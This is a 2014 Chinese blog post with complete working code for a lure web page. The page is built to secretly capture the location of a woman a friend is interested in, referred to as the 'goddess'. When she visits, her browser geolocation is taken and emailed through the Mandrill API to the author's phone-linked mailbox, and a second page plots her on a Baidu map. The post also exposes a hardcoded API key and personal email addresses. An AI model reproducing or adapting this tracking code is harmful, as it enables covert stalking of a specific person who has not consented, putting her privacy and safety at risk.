---
layout: page
title:  "定位女神在哪里"
description: "浏览器定位,女神在哪里,定位女神"
keywords: 浏览器定位,女神在哪里,定位女神,webkit,chrome,safari
origin: 张嘉杰.原创
date:   2014-09-19
category: browser
tags: webkit chrome html5
---
周五下班回家路上，接到了一位很久未联系的朋友打过来的电话（省略一些敏感话题），切入主题：哥们儿想知道自己的女神住哪儿，又不方便直接问。我想到了一个自己在`2012`年做项目的时候，使用过的一个方法，在这里分享给需要的朋友。
<!--more-->

> 实现思路： 

{% highlight html %}

1. 设计美观界面。  
2. 让女神访问固定地址，获取其IP、经度、纬度。  
3. 获取成功，触发邮件至139邮箱（设置短信提醒）。
4. 通过短信返回URL地址，访问地图标出精确位置。

{% endhighlight %}

> 使用技术：

{% highlight html %}

+-----------+---------+-------------------------+
|  Project  | Version |       Description       |
+-----------------------------------------------+
|  jQuery   | 1.11.1  |  javaScript Framework   |
+-----------------------------------------------+
| MailChimp |   1.0   |     Mail Providers      |
+-----------------------------------------------+
| Map Baidu |   2.0   |     Map Providers       |
+-----------------------------------------------+
|Geolocation|  html5  |     Geolocation api     |
+-----------+---------+-------------------------+

{% endhighlight %}

> 技术介绍下载、注册。

[jQuery] 具体就不说啦 大家可以去官网方站。  

[百度地图API] 用的是javascript API大众版。    

Geolocation 支持html5新属性的浏览器（IE9以下的还是放弃吧）。  

免费的`邮件服务`有很多，像 [Mail_Mandrill]、[Mail_Mailgun]、[Mail_SOHO]。 主要说下 [Mail_Mandrill] ，参考文档：[Api_Mail_Mandrill]，注册过程看图。  

Mandrill 注册账号：


![Mail_Mandrill_0]({{ "/resources/images" | prepend: site.staticurl }}{{ page.url }}-0.jpg)

Mandrill 获取API：


![Mail_Mandrill_1]({{ "/resources/images" | prepend: site.staticurl }}{{ page.url }}-1.jpg)

Mandrill 创建API keys：


![Mail_Mandrill_2]({{ "/resources/images" | prepend: site.staticurl }}{{ page.url }}-2.jpg)

> HTML5 Geolocation API的使用方法及实现原理

女神访问页面脚本：
{% highlight javascript %}

var Goddess = {
    /** 防止重复 */
    repeat : true,
    /** 初始化 */
    init: function() {
        var self = this;
        if(this.repeat) {
           this.gps(function(mail) {
                self.sendMail({ subject : mail.subject, html : mail.html });
                this.repeat = false;
           });
        }
    },
    /** 获取gps经度纬度坐标 */
    gps: function(callfun) {
        //判断浏览器是否支持geolocation
        if(navigator.geolocation){
            var message = "", address="";
            navigator.geolocation.getCurrentPosition(function (position){
                var lon = position.coords.longitude; //经度
                var lat = position.coords.latitude;  //纬度

                if(position.address){  //是否支持address属性
                    //通过address，可以获得国家、省份、城市
                    var _a = position.address;
                    address =  "(" + (_a.country + _a.province + _a.city) + ")";
                }
                message = ( "lat=" + lat + "&lon=" + lon );
                callfun({
                    tip : true,
                    subject : "女神地址获取成功，速速查看^0^...",
                    html : "<a href=\"http://jcore.cn/getaddress.html?"+message+"\" target=\"_blank\" >戳我..."+ address +"</a>"
                });

            }, function (error) {
                var type = { //转义友好提示
                    1: ['这里转义友好提示.[1]', "女神拒绝提供地理位置（自己想办法咯）"],
                    2: ['这里转义友好提示.[2]', "获取不到女神位置信息（爱莫能助啊）"],
                    3: ['这里转义友好提示.[3]', "超时（多访问几次，或者过段时间再次尝试）"]
                }
                var tip = type[error.code];
                alert(tip[0]);
                message = ('获取数据失败：' + tip[1]);
                callfun({  //失败也发送错误提醒
                    tip : true,
                    subject : "女神地址获取失败，不哭不哭T_T...",
                    html : message
                });
            });
        }
    },
    /** 发送邮件 */
    sendMail: function(mail){
        if (mail.subject == "" || mail.html == "") return;
        //jQuery发送请求
        $.ajax({
            type: "POST",
            url: "https://mandrillapp.com/api/1.0/messages/send.json", //json接口地址
            data:{
                "key": "xuMao7xRBKlImfxtfl3IlA", //服务允许key
                "message":{
                    "from_email": "zj7687362@gmail.com", //发送邮件地址
                    "to": [ //发送信息(可多个同时发送)
                        {
                            "email": "zhangjiajie1314@139.com",
                            "name": "张嘉杰",
                            "type": "to"
                        }
                    ],
                    "subject": mail.subject || "", //邮件标题
                    "html": mail.html || "" //邮件内容
                }
            }
        }).done(function (response) {
            console.log(response);
            alert("成功咯.");
        });
    }
}

{% endhighlight %}

接收显示页面脚本：
{% highlight javascript %}

(function(){
    function load_script(xyUrl, callback){
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = xyUrl;
        script.onload = script.onreadystatechange = function(){
            if((!this.readyState || this.readyState === "loaded" || this.readyState === "complete")){
                callback && callback();
                script.onload = script.onreadystatechange = null;
                if ( head && script.parentNode ) {
                    head.removeChild( script );
                }
            }
        };
        head.insertBefore( script, head.firstChild );
    }
    function translate(point,type,callback){
        var callbackName = 'cbk_' + Math.round(Math.random() * 10000);	//随机函数名
        var xyUrl = "http://api.map.baidu.com/ag/coord/convert?" +
                    "from="+ type +
                    "&to=4" +
                    "&x=" + point.lng +
                    "&y=" + point.lat +
                    "&callback=BMap.Convertor." + callbackName;
        //动态创建script标签
        load_script(xyUrl);
        BMap.Convertor[callbackName] = function(xyResult){
            delete BMap.Convertor[callbackName];	//调用完需要删除改函数
            var point = new BMap.Point(xyResult.x, xyResult.y);
            callback && callback(point);
        }
    }
    window.BMap = window.BMap || {};
    BMap.Convertor = {};
    BMap.Convertor.translate = translate;
})();
//获取URL参数
function getQueryStringRegExp(name) {
    var reg = new RegExp("(^|\\?|&)"+ name +"=([^&]*)", "i");
    if (reg.test(location.href))
        return unescape(RegExp.$2.replace(/\+/g, " "));
    return "";
};
var lon = getQueryStringRegExp('lon');
var lat = getQueryStringRegExp('lat');
// 百度地图API功能
var gpsPoint = new BMap.Point(lon,lat);
//地图初始化
var bm = new BMap.Map("allmap");
bm.centerAndZoom(gpsPoint, 16);
bm.addControl(new BMap.NavigationControl());
//坐标转换完之后的回调函数
var translateCallback = function (point){
    var marker = new BMap.Marker(point);
    bm.addOverlay(marker);
    var label = new BMap.Label("亲，女神的位置哦",{offset:new BMap.Size(20,-10)});
    marker.setLabel(label); //添加百度label
    bm.setCenter(point);
    console.log(point.lng + "," + point.lat);
}
setTimeout(function(){
    new BMap.Convertor.translate(gpsPoint,0,translateCallback);	 //真实经纬度转成百度坐标
}, 2000); //延迟2秒执行

{% endhighlight %}

###未完待续... :)

-----------------------

相关参考文章地址：

Geolocation-API - <http://www.htmq.com/geolocation/>  

-----------------------

[百度地图API]: http://developer.baidu.com/map/
[jQuery]: http://jquery.com/
[Mail_SOHO]: http://sendcloud.sohu.com/
[Mail_Mailgun]: http://www.mailgun.com/
[Mail_Mandrill]: http://mandrillapp.com/
[Api_Mail_Mandrill]: https://mandrillapp.com/api/docs/messages.JSON.html